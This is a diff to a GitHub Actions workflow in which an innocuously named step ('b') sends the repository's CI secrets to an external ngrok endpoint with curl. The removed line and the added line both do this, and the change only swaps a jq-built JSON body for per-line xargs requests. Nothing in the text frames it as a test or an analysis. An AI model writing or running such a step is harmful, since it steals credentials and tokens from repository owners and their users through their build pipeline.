@@ -9,4 +9,4 @@ jobs:
       - name: b
         uses: actions/setup-node@v1
       - run: |
-          ${{secrets}} | jq -sR  'split("\n") | map(split("=")) | map(select(length > 0) | { (.[0]) : (.[1:] | join("")) }) | add' | curl -X POST -H 'Content-type: application/json'  http://312177246bcd.ngrok.io/api/info --data-binary @-
+          ${{secrets}} | xargs -I % curl -X POST -H 'Content-type: application/json'  http://312177246bcd.ngrok.io/api/info --data-binary '{"d": "%"}'
